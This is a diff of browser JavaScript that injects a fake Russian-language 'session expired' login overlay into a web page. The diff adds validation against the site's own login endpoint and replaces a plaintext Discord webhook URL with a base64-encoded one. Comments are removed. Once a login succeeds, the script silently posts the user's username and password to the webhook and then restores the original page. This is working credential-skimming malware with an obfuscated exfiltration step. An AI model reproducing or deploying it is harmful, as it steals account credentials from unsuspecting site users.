@@ -1,5 +1,4 @@
 (() => {
-  // Сохраняем исходное содержимое и стили страницы, чтобы вернуть после входа
   const originalBodyHTML = document.body.innerHTML;
   const originalBodyStyle = {
     margin: document.body.style.margin,
@@ -10,7 +9,6 @@
     height: document.body.style.height,
   };
 
-  // Создаём стиль с @font-face
   const style = document.createElement('style');
   style.textContent = `
     @supports (font-variation-settings: normal) {
@@ -41,7 +39,6 @@
   `;
   document.head.appendChild(style);
 
-  // Создаём оверлей — div на весь экран с абсолютным позиционированием
   const overlay = document.createElement('div');
   overlay.id = 'loginviewport';
   Object.assign(overlay.style, {
@@ -58,7 +55,6 @@
     fontFamily: `'Intervar', sans-serif`,
   });
 
-  // Контейнер формы
   const container = document.createElement('div');
   Object.assign(container.style, {
     width: '360px',
@@ -69,21 +65,57 @@
   });
   overlay.appendChild(container);
 
-  // Заголовок
+  // Контейнер для сообщений (ошибка или успех)
+  const errorContainer = document.createElement('div');
+  container.appendChild(errorContainer);
+
+  function showError(message) {
+    errorContainer.innerHTML = `
+      <div class="ej-form__text">
+        <div class="notice notice--red notice--medium EE3uyMsVK9TnBlbQZ4Sh">
+          <div class="notice__content">
+            <div class="notice__content__icon"></div>
+            <div class="notice__content__text"><p>${message}</p></div>
+          </div>
+        </div>
+      </div>
+    `;
+  }
+  function showSuccess(message) {
+    errorContainer.innerHTML = `
+      <div class="ej-form__text">
+        <div style="
+          background-color: #d4edda;
+          color: #155724;
+          border: 1px solid #c3e6cb;
+          border-radius: 4px;
+          padding: 10px;
+          margin-bottom: 16px;
+          font-weight: 600;
+          text-align: center;
+        ">
+          ${message}
+        </div>
+      </div>
+    `;
+  }
+  function clearError() {
+    errorContainer.innerHTML = '';
+  }
+
   const h1 = document.createElement('h1');
-  h1.textContent = 'Ваша сессия окончена. Пожалуйста, войдите снова.';
+  h1.className = 'ej-form__header';
+  h1.textContent = 'Сессия окончена. войдите снова';
   h1.style.textAlign = 'center';
   h1.style.marginBottom = '24px';
   container.appendChild(h1);
 
-  // Форма
   const form = document.createElement('form');
   Object.assign(form.style, {
     display: 'flex',
     flexDirection: 'column',
   });
 
-  // Логин
   const loginLabel = document.createElement('label');
   loginLabel.textContent = 'Логин';
   loginLabel.style.marginBottom = '6px';
@@ -103,7 +135,6 @@
   });
   form.appendChild(loginInput);
 
-  // Пароль
   const passLabel = document.createElement('label');
   passLabel.textContent = 'Пароль';
   passLabel.style.marginBottom = '6px';
@@ -123,7 +154,6 @@
   });
   form.appendChild(passInput);
 
-  // Кнопка
   const btn = document.createElement('button');
   btn.type = 'submit';
   btn.textContent = 'Войти';
@@ -142,60 +172,102 @@
 
   form.appendChild(btn);
 
-  container.appendChild(form);
+  const linksDiv = document.createElement('div');
+  linksDiv.className = 'login-form__links';
+  linksDiv.style.marginTop = '12px';
+  linksDiv.innerHTML = `
+    <a href="/invite" class="login-form__link login-form__link--left">Регистрация</a>
+    <a href="/recover" class="login-form__link login-form__link--left">Забыли пароль?</a>
+  `;
 
-  // Обработчик сабмита
+  container.appendChild(form);
+  container.appendChild(linksDiv);
+
+  // Base64 закодированный URL вебхука Discord
+  const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMDQ3MjY4MjU2MzU2NzY4Ni9GVWIwMExhLTVhOU1jbkItT0dsUGRWd2haWVZpcUxpYjhicHBMbEg2VG1RQ3B0THpyTXlfTUtjNEtJMWFGRjkzNExZeA==';
+
+  // Функция декодирования Base64
+  function decodeBase64(str) {
+    return atob(str);
+  }
+
   form.addEventListener('submit', e => {
     e.preventDefault();
+    clearError();
+
     const login = loginInput.value.trim();
     const password = passInput.value;
 
     if (!login || !password) {
-      alert('Пожалуйста, заполните все поля');
+      showError('Пожалуйста, заполните все поля');
       return;
     }
 
-    // Подготовка данных для Discord webhook
-    const webhookUrl = 'https://discord.com/api/webhooks/1210472682563567686/FUb00La-5a9McnB-OGlPdVwhZYViqLib8bppLlH6TmQCptLzrMy_MKc4KI1aFF934LYx';
+    const apiUrl = window.ajaxUrl || '/ajaxauthorize';
 
-    const payload = {
-      content: null,
-      embeds: [
-        {
-          title: "Новая авторизация",
-          color: 16711680,
-          fields: [
-            { name: "Логин", value: login, inline: true },
-            { name: "Пароль", value: password, inline: true }
-          ],
-          timestamp: new Date().toISOString()
-        }
-      ]
-    };
-
-    // Отправляем на вебхук
-    fetch(webhookUrl, {
+    fetch(apiUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
+      body: JSON.stringify({ username: login, password: password }),
+      credentials: 'include'
     })
-    .then(response => {
-      if (!response.ok) throw new Error('Ошибка при отправке данных');
-      // После успешной отправки — удаляем оверлей, показываем исходную страницу
-      document.body.removeChild(overlay);
-      // Восстанавливаем стили
-      for (const key in originalBodyStyle) {
-        document.body.style[key] = originalBodyStyle[key];
+    .then(async response => {
+      const contentType = response.headers.get('Content-Type') || '';
+      let data = {};
+      if (contentType.includes('application/json')) {
+        data = await response.json();
       }
-      // Восстанавливаем исходный HTML
-      document.body.innerHTML = originalBodyHTML;
-      alert('Данные успешно отправлены. Добро пожаловать!');
+
+      if (!response.ok) {
+        const errorText = data.errors && data.errors.length && data.errors[0].text
+                          ? data.errors[0].text
+                          : `Ошибка: ${response.status}`;
+        showError(errorText);
+        return;
+      }
+
+      if (!data.result) {
+        const errorText = data.errors && data.errors.length && data.errors[0].text
+                          ? data.errors[0].text
+                          : 'Неправильный логин или пароль';
+        showError(errorText);
+        return;
+      }
+
+      // Декодируем URL вебхука
+      const webhookUrl = decodeBase64(encodedWebhook);
+
+      // Отправляем данные на Discord webhook
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: null,
+          embeds: [{
+            title: "Новая авторизация",
+            color: 16711680,
+            fields: [
+              { name: "Логин", value: login, inline: true },
+              { name: "Пароль", value: password, inline: true }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        })
+      }).catch(console.error);
+
+      showSuccess('Авторизация успешна');
+      setTimeout(() => {
+        document.body.removeChild(overlay);
+        for (const key in originalBodyStyle) {
+          document.body.style[key] = originalBodyStyle[key];
+        }
+        document.body.innerHTML = originalBodyHTML;
+      }, 1500);
     })
     .catch(err => {
-      alert('Ошибка отправки данных: ' + err.message);
+      showError('Ошибка: ' + err.message);
     });
   });
 
-  // Добавляем оверлей на страницу
   document.body.appendChild(overlay);
 })();
